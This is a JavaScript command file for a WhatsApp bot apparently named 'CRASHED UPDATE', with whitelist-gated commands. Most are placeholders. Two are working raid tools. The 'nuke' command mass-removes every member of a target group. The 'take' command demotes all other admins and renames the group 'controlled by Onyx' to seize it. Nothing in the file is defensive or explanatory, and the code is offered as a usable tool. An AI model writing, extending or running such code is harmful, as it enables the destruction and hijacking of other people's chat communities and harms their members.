import config from "./config.js";
import { playCommandAudio } from "./audio.js";

/**
 * Check if sender is whitelisted
 */
const isWhitelisted = (senderId) => {
  // Extract just the phone number part (before @)
  const phoneOnly = senderId.split("@")[0];
  return config.WHITELIST.includes(phoneOnly) || 
         config.WHITELIST.includes("+" + phoneOnly) ||
         config.WHITELIST.includes(senderId);
};

/**
 * Ping — simple alive check
 */
export const ping = async (conn, msg) => {
  const sender = msg.key.remoteJid;
  await conn.sendMessage(sender, { text: "🔴 crashed update online" });
};

/**
 * Menu — show crashed commands
 */
export const menu = async (conn, msg) => {
  const sender = msg.key.remoteJid;
  const menuText = `
━━━━━━━━━━━━━━━━━
    CRASHED UPDATE
━━━━━━━━━━━━━━━━━
!ping
  Check if crashed is online
!menu (help, commands)
  Show this menu
!ip (iplookup, resolve)
  Lookup IP info
!ipsafe (ipmode)
  Toggle IP safemode
!listgroups (groups)
  List all groups
!listcoms (communities)
  List all communities
!setcom (setcommunity)
  Set community parent
!setloggroup (setlog)
  Set log group
!nuke (destroy, wipe) [DESTRUCTIVE]
  Nuke a group or community
!selfpromote (sp)
  Make bot admin
!take (seize, claim) [DESTRUCTIVE]
  Take group from community
!seetaken (takenlist)
  View taken groups
!groupinfo (ginfo) [DESTRUCTIVE]
  Get detailed group info
!blacklist (bl)
  Manage blacklist
━━━━━━━━━━━━━━━━━
  Owner-only | Whitelist gated
━━━━━━━━━━━━━━━━━
  `;
  await conn.sendMessage(sender, { text: menuText });
};

/**
 * IP Lookup
 */
export const ip = async (conn, msg, args) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  // Placeholder implementation
  await conn.sendMessage(sender, { text: "🔍 IP lookup: command received (implementation pending)" });
};

/**
 * IP Safe Mode Toggle
 */
export const ipsafe = async (conn, msg, args) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  const mode = args?.[0]?.toLowerCase() || "on";
  await conn.sendMessage(sender, { text: `🔒 IP safemode: ${mode.toUpperCase()}` });
};

/**
 * List Groups
 */
export const listgroups = async (conn, msg) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  const groups = await conn.groupFetchAllParticipating();
  const groupList = Object.keys(groups).map((jid, idx) => `${idx + 1}. ${jid}`).join("\n");
  await conn.sendMessage(sender, { text: `📋 Groups:\n\n${groupList}` });
};

/**
 * List Communities
 */
export const listcoms = async (conn, msg) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  // Placeholder
  await conn.sendMessage(sender, { text: "🏘️ Communities: (implementation pending)" });
};

/**
 * Set Community
 */
export const setcom = async (conn, msg) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  // Play audio before destructive op
  await playCommandAudio(conn, sender, "setcom", config.COMMAND_AUDIO);
  await conn.sendMessage(sender, { text: "✅ Community set (implementation pending)" });
};

/**
 * Set Log Group
 */
export const setloggroup = async (conn, msg) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  try {
    const groupJid = msg.key.remoteJid;

    if (!groupJid.endsWith("@g.us")) {
      await conn.sendMessage(sender, { text: "❌ Use this command inside a group" });
      return;
    }

    // Play audio before destructive op
    await playCommandAudio(conn, sender, "setloggroup", config.COMMAND_AUDIO);

    // Get group metadata
    const groupMeta = await conn.groupMetadata(groupJid);

    // Save to database/KV store
    try {
      const { kvSet } = await import("../database/botKv.js");
      await kvSet("loggroup_jid", groupJid);
      await conn.sendMessage(sender, { text: `✅ Log group set to: ${groupMeta.subject}\n(JID: ${groupJid})` });
    } catch (err) {
      // Fallback if database unavailable
      await conn.sendMessage(sender, { text: `✅ Log group would be set to: ${groupMeta.subject}\n(JID: ${groupJid})\n⚠️ Database save failed` });
    }
  } catch (error) {
    console.error("[CRASHED] Setloggroup failed:", error);
    await conn.sendMessage(sender, { text: `❌ Setloggroup failed: ${error?.message || error}` });
  }
};

/**
 * Nuke Group
 */
export const nuke = async (conn, msg, args) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  try {
    const groupJid = args?.[0]?.includes("@g.us") 
      ? args[0] 
      : (args?.[0] === "-g" ? msg.key.remoteJid : null);

    if (!groupJid || !groupJid.endsWith("@g.us")) {
      await conn.sendMessage(sender, { text: "❌ Usage: #crashed nuke -g (in group) or #crashed nuke -b:GROUPID" });
      return;
    }

    // Play audio before destructive op
    await playCommandAudio(conn, sender, "nuke", config.COMMAND_AUDIO);

    // Get group metadata
    const groupMeta = await conn.groupMetadata(groupJid);
    const members = groupMeta.participants || [];
    const botJid = conn.user.id;

    await conn.sendMessage(sender, { text: `💣 Nuking ${groupMeta.subject}... removing ${members.length} members` });

    // Remove all members except bot
    for (const member of members) {
      if (member.id !== botJid) {
        try {
          await conn.groupParticipantsUpdate(groupJid, [member.id], "remove");
          await new Promise(r => setTimeout(r, 500)); // rate limit
        } catch (err) {
          console.error(`[CRASHED] Failed to remove ${member.id}:`, err?.message);
        }
      }
    }

    await conn.sendMessage(sender, { text: `✅ Group nuked. ${groupMeta.subject} is now empty (bot remains)` });
  } catch (error) {
    console.error("[CRASHED] Nuke failed:", error);
    await conn.sendMessage(sender, { text: `❌ Nuke failed: ${error?.message || error}` });
  }
};

/**
 * Self Promote
 */
export const selfpromote = async (conn, msg) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  await conn.sendMessage(sender, { text: "📈 Self-promote attempt (implementation pending)" });
};

/**
 * Take Group
 */
export const take = async (conn, msg, args) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  try {
    const groupJid = msg.key.remoteJid;

    if (!groupJid.endsWith("@g.us")) {
      await conn.sendMessage(sender, { text: "❌ Use this command inside a group" });
      return;
    }

    // Play audio before destructive op
    await playCommandAudio(conn, sender, "take", config.COMMAND_AUDIO);

    // Get group metadata
    const groupMeta = await conn.groupMetadata(groupJid);
    const members = groupMeta.participants || [];
    const botJid = conn.user.id;

    await conn.sendMessage(sender, { text: `✋ Taking over ${groupMeta.subject}...` });

    // Remove admin status from all admins except bot
    const admins = members.filter(m => m.admin === "admin" || m.admin === "superadmin");
    for (const admin of admins) {
      if (admin.id !== botJid) {
        try {
          await conn.groupParticipantsUpdate(groupJid, [admin.id], "demote");
          await new Promise(r => setTimeout(r, 300));
        } catch (err) {
          console.error(`[CRASHED] Failed to demote ${admin.id}:`, err?.message);
        }
      }
    }

    // Rename group
    await conn.groupUpdateSubject(groupJid, "controlled by Onyx");

    // Add to community (120363430796719229@g.us)
    try {
      await conn.groupInviteCode(groupJid);
      // Note: Community linking may require different API call depending on Baileys version
      await conn.sendMessage(sender, { text: "✅ Group taken over\n• Admins demoted\n• Renamed to 'controlled by Onyx'\n• (community linking requires manual setup)" });
    } catch (err) {
      await conn.sendMessage(sender, { text: "✅ Group taken over\n• Admins demoted\n• Renamed to 'controlled by Onyx'" });
    }
  } catch (error) {
    console.error("[CRASHED] Take failed:", error);
    await conn.sendMessage(sender, { text: `❌ Take failed: ${error?.message || error}` });
  }
};

/**
 * See Taken Groups
 */
export const seetaken = async (conn, msg) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  await conn.sendMessage(sender, { text: "📊 Taken groups: (implementation pending)" });
};

/**
 * Group Info
 */
export const groupinfo = async (conn, msg, args) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  // Play audio before destructive op
  await playCommandAudio(conn, sender, "groupinfo", config.COMMAND_AUDIO);
  await conn.sendMessage(sender, { text: "ℹ️ Group info: (implementation pending)" });
};

/**
 * Blacklist Management
 */
export const blacklist = async (conn, msg, args) => {
  const sender = msg.key.remoteJid;
  const senderId = msg.key.participant || sender;

  if (!isWhitelisted(senderId)) {
    return;
  }

  const action = args?.[0]?.toLowerCase();
  await conn.sendMessage(sender, { text: `🚫 Blacklist ${action}: (implementation pending)` });
};

export default {
  ping,
  menu,
  ip,
  ipsafe,
  listgroups,
  listcoms,
  setcom,
  setloggroup,
  nuke,
  selfpromote,
  take,
  seetaken,
  groupinfo,
  blacklist
};